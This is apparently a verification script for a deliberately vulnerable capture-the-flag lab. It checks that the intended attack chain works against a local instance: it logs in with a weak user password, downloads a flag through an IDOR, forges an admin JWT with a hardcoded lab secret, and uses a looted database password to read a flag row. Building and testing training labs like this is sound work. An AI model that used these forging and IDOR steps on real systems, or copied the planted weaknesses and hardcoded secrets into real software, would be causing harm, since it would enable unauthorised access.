#!/usr/bin/env bash
# v1.1.0 — Examiner dry-run for CTF stack (prod + ctf overlay).
set -euo pipefail

BASE="${BASE:-http://127.0.0.1:8080}"
CTF_DB_PASSWORD="${CTF_DB_PASSWORD:-KcCtfDbPr0of2026!}"
JWT_SECRET="${JWT_SECRET:-kc-ctf-lab-jwt-secret}"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

fail() { echo "FAIL: $*" >&2; exit 1; }
ok() { echo "  OK: $*"; }

echo "CTF examiner dry-run → ${BASE}"

echo "Health..."
curl -sS -f "${BASE}/api/health" | grep -q '"status":"ok"' || fail "health"
ok "health"

echo "Default postgres creds must fail (host :5433 TCP)..."
PG_HOST="${PG_HOST:-host.docker.internal}"
if docker run --rm -e PGPASSWORD=postgres postgres:16-alpine \
  psql -h "${PG_HOST}" -p 5433 -U postgres -d kc_prod -c 'SELECT 1' >/dev/null 2>&1; then
  fail "postgres/postgres must not work on published :5433 (set DB_PASSWORD in infra/.env or env)"
fi
ok "postgres/postgres denied on :5433"

echo "Lisa login (hydra target)..."
LOGIN=$(curl -sS -X POST "${BASE}/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"lisa@kc.test","password":"lisa123"}')
echo "$LOGIN" | grep -q '"token"' || fail "lisa login: $LOGIN"
USER_TOKEN=$(echo "$LOGIN" | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
ok "lisa session"

echo "User proof — IDOR local.txt (9104)..."
LOCAL=$(curl -sS -H "Authorization: Bearer ${USER_TOKEN}" "${BASE}/api/files/9104/download")
echo "$LOCAL" | grep -qE '^[0-9a-f]{32}$' || fail "local flag body: $LOCAL"
ME=$(curl -sS -H "Authorization: Bearer ${USER_TOKEN}" "${BASE}/api/auth/me")
echo "$ME" | grep -q 'lisa@kc.test' || fail "auth/me for lisa"
ok "user proof (lisa + local.txt)"

echo "Forge admin JWT (HS256)..."
USER_ID=$(echo "$LOGIN" | python3 -c "import json,sys; print(json.load(sys.stdin)['userId'])")
ADMIN_TOKEN=$(cd "${ROOT}/backend" && node -e "
const jwt=require('jsonwebtoken');
console.log(jwt.sign({sub:'${USER_ID}',email:'lisa@kc.test',role:'admin'}, '${JWT_SECRET}', {expiresIn:'1h'}));
")

echo "Admin proof — proof.txt (9105)..."
PROOF=$(curl -sS -H "Authorization: Bearer ${ADMIN_TOKEN}" "${BASE}/api/files/9105/download")
echo "$PROOF" | grep -qE '^[0-9a-f]{32}' || fail "proof flag: $PROOF"
echo "$PROOF" | grep -q "DB_PASSWORD=" || fail "DB loot line missing"
ok "admin proof (forged admin + proof.txt)"

DB_PASS=$(echo "$PROOF" | grep DB_PASSWORD | cut -d= -f2 | tr -d '\r')
echo "DB proof — ctf_flag row (loot password)..."
ROW=$(docker compose -f "${ROOT}/infra/docker-compose.prod.yml" -f "${ROOT}/infra/docker-compose.ctf.yml" \
  exec -T -e PGPASSWORD="$DB_PASS" postgres psql -U postgres -d kc_prod -tA -c "SELECT value FROM ctf_flag WHERE name='proof'")
echo "$ROW" | grep -qE '^[0-9a-f]{32}$' || fail "db flag: $ROW"
ok "db proof (postgres + ctf_flag)"

echo "CTF examiner dry-run passed."
